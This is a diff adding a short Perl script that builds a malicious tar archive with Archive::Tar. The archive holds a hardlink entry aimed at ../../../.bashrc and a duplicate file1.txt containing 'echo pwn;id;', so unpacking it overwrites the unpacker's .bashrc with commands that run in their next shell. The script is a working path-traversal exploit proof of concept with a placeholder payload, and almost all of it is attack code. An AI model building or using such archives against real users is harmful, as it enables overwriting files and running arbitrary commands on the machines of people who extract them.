@@ -1,0 +1,20 @@
+#!/usr/bin/perl -w
+
+use Archive::Tar;
+
+print "[*] Creating evil tarball ...\n";
+
+my $tar = Archive::Tar->new();
+
+# WARNING: This will overwrite your .bashrc when you unpack it
+my %h1 = (linkname => "../../../.bashrc", type => Archive::Tar::Constant::HARDLINK );
+
+$tar->add_data('file1.txt', '', \%h1);
+$tar->add_data('file2.txt', 'INNOCENT DATA');
+$tar->add_data('file1.txt', "\necho pwn;id;\n");
+
+$tar->write('/tmp/pwn.tar');
+
+print "[+] Success!\n";
+print "[!] BE WARNED: DO NOT UNPACK /tmp/pwn.tar as it will overwrite your files.\n";
+
